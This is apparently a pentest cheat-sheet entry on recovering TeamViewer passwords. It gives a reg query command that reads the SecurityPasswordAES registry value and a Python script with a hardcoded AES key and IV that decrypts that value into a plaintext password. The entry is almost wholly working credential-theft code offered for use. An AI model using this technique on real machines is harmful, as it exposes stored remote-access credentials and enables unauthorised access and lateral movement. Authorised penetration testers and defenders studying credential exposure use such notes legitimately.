

Check the TeamViewer registry key (based on the version) and look for any stored password. For example, the key `SecurityPasswordAES` holds the encrypted password value.

```bash
reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7

```

If you find the key, use this script to decrypt it:

```bash
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "d690a9d0a592327f99bb4c6a6b6d4cbe"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```